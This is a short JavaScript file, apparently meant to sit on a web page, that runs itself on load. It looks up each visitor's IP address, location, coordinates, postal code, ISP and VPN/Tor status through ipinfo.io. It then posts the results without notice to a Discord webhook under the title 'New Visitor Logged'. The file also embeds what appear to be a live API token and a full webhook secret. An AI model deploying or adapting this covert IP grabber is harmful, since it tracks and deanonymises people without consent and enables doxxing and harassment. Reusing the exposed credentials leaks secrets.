const IPINFO_TOKEN = "7223e65562f40f";  // Replace with a new token when it expires
const WEBHOOK_URL = "https://discord.com/api/webhooks/1334046008681693204/5YbMMb4m4OjVC6iiQSSbP0t7N1VSGSvmP4Lbtjc-KM44-gmWl_0VcUzVkolVxWAZTOuP";  // Replace with your Discord webhook

async function fetchIPDetails() {
    try {
        const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
        const data = await response.json();

        if (data.error) {
            console.error("Error fetching IP details:", data.error.message);
            return setDefaultData();
        }
        return data;
    } catch (error) {
        console.error("Failed to fetch IP details:", error);
        return setDefaultData();
    }
}

function setDefaultData() {
    return {
        ip: "NA", hostname: "NA", city: "NA", region: "NA", country: "NA", loc: "NA",
        postal: "NA", timezone: "NA", anycast: false,
        asn: { asn: "NA", name: "NA", domain: "NA", route: "NA", type: "NA" },
        company: { name: "NA", domain: "NA", type: "NA" },
        privacy: { vpn: false, proxy: false, tor: false, relay: false, hosting: false, service: "NA" },
        abuse: { address: "NA", country: "NA", email: "NA", name: "NA", network: "NA", phone: "NA" },
        domains: { ip: "NA", total: "NA", domains: [] }
    };
}

async function sendToDiscord(ipData) {
    const embed = {
        title: "🔍 New Visitor Logged",
        color: 16711680,
        fields: [
            { name: "📌 IP", value: ipData.ip || "NA", inline: true },
            { name: "🏠 Hostname", value: ipData.hostname || "NA", inline: true },
            { name: "📍 Location", value: `${ipData.city || "NA"}, ${ipData.region || "NA"}, ${ipData.country || "NA"}`, inline: false },
            { name: "🌎 Coordinates", value: ipData.loc || "NA", inline: true },
            { name: "📮 Postal Code", value: ipData.postal || "NA", inline: true },
            { name: "⏰ Timezone", value: ipData.timezone || "NA", inline: true },
            { name: "🔀 Anycast", value: ipData.anycast ? "Yes" : "No", inline: true },
            { name: "🏢 ASN", value: `${ipData.asn?.asn || "NA"} - ${ipData.asn?.name || "NA"} (${ipData.asn?.domain || "NA"})`, inline: false },
            { name: "📡 Route", value: ipData.asn?.route || "NA", inline: true },
            { name: "🏬 Company", value: `${ipData.company?.name || "NA"} (${ipData.company?.domain || "NA"})`, inline: false },
            { name: "🔐 VPN", value: ipData.privacy?.vpn ? "Yes" : "No", inline: true },
            { name: "🌍 Proxy", value: ipData.privacy?.proxy ? "Yes" : "No", inline: true },
            { name: "🕵️ Tor", value: ipData.privacy?.tor ? "Yes" : "No", inline: true },
            { name: "🔁 Relay", value: ipData.privacy?.relay ? "Yes" : "No", inline: true },
            { name: "📡 Hosting", value: ipData.privacy?.hosting ? "Yes" : "No", inline: true },
            { name: "🛠 Service", value: ipData.privacy?.service || "NA", inline: false },
            { name: "🚨 Abuse Contact", value: `${ipData.abuse?.name || "NA"} (${ipData.abuse?.email || "NA"})`, inline: false },
            { name: "📞 Abuse Phone", value: ipData.abuse?.phone || "NA", inline: true },
            { name: "📬 Abuse Address", value: ipData.abuse?.address || "NA", inline: false },
            { name: "🌐 Domains", value: ipData.domains?.domains?.join(", ") || "NA", inline: false }
        ]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });
        console.log("✅ IP info sent to Discord successfully!");
    } catch (error) {
        console.error("❌ Failed to send data to Discord:", error);
    }
}

(async function () {
    const ipData = await fetchIPDetails();
    await sendToDiscord(ipData);
})();
